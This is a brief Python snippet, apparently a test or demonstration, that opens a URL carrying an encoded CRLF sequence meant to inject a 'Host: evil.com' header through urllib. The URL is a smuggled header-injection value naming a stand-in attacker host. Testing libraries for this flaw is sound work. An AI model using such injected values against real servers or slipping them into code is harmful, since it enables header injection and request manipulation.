```
```python
# Import the urllib module
import urllib.request

# Open a malicious URL with a CRLF injection
try:
    response = urllib.request.urlopen('http://example.com/%0D%0AHost:%20evil.com')

    # Print the response headers
    print(response.headers)
except urllib.error.URLError as e:
    print(f"Error: {e}")
